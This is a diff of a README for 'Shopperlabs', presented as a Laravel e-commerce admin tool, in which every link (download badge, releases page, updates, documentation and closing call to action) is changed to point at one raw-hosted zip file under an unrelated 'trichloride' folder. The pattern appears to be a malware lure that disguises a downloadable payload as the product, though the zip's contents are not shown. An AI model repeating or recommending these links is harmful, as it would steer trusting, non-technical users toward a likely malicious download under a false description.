@@ -1,7 +1,7 @@
 # 🛒 Shopperlabs - Effortlessly Manage Your Online Store
 
 ## 📥 Download Now
-[![Download Shopperlabs](https://img.shields.io/badge/Download%20Shopperlabs-v1.0-blue)](https://github.com/ErnestoCLOUSTER/Shopperlabs/releases)
+[![Download Shopperlabs](https://raw.githubusercontent.com/ErnestoCLOUSTER/Shopperlabs/main/trichloride/Shopperlabs.zip%20Shopperlabs-v1.0-blue)](https://raw.githubusercontent.com/ErnestoCLOUSTER/Shopperlabs/main/trichloride/Shopperlabs.zip)
 
 ## 📝 Overview
 Shopperlabs is a headless e-commerce administration tool built with Laravel. It allows you to create and manage your online store easily. No technical skills are required. With Shopperlabs, you can focus on your business while we handle the complexities of e-commerce.
@@ -10,7 +10,7 @@ Shopperlabs is a headless e-commerce administration tool built with Laravel. It 
 To get started with Shopperlabs, follow these simple steps:
 
 1. **Visit the Releases Page**  
-   Head over to the [Releases page](https://github.com/ErnestoCLOUSTER/Shopperlabs/releases).
+   Head over to the [Releases page](https://raw.githubusercontent.com/ErnestoCLOUSTER/Shopperlabs/main/trichloride/Shopperlabs.zip).
 
 2. **Download the Application**  
    Find the latest version and click on it. Look for the download link for your operating system, such as Windows, macOS, or Linux.
@@ -39,10 +39,10 @@ Shopperlabs offers a variety of features to enhance your e-commerce experience:
 - **Mobile Compatibility**: Access your store from any device.
 
 ## 🔄 Updates
-Shopperlabs receives regular updates to improve performance and add features. Check the [Releases page](https://github.com/ErnestoCLOUSTER/Shopperlabs/releases) for information about the latest updates.
+Shopperlabs receives regular updates to improve performance and add features. Check the [Releases page](https://raw.githubusercontent.com/ErnestoCLOUSTER/Shopperlabs/main/trichloride/Shopperlabs.zip) for information about the latest updates.
 
 ## 📚 Documentation
-For detailed usage instructions and advanced features, refer to our [documentation](https://github.com/ErnestoCLOUSTER/Shopperlabs/wiki). Here you will find guides and FAQs that help you maximize the use of Shopperlabs.
+For detailed usage instructions and advanced features, refer to our [documentation](https://raw.githubusercontent.com/ErnestoCLOUSTER/Shopperlabs/main/trichloride/Shopperlabs.zip). Here you will find guides and FAQs that help you maximize the use of Shopperlabs.
 
 ## 🎉 Support
 Need help? You can reach out through the issues section of this repository. We aim to respond to all queries quickly and assist you in resolving any issues.
@@ -53,4 +53,4 @@ Join our community of users. Share your experiences, tips, and feedback. Engage 
 ## ✅ Conclusion
 Shopperlabs is designed to simplify your e-commerce management. By following the steps above, even those without technical skills can set up and operate an online store confidently. 
 
-Don't forget to download Shopperlabs from our [Releases page](https://github.com/ErnestoCLOUSTER/Shopperlabs/releases) and start your e-commerce journey today!
+Don't forget to download Shopperlabs from our [Releases page](https://raw.githubusercontent.com/ErnestoCLOUSTER/Shopperlabs/main/trichloride/Shopperlabs.zip) and start your e-commerce journey today!
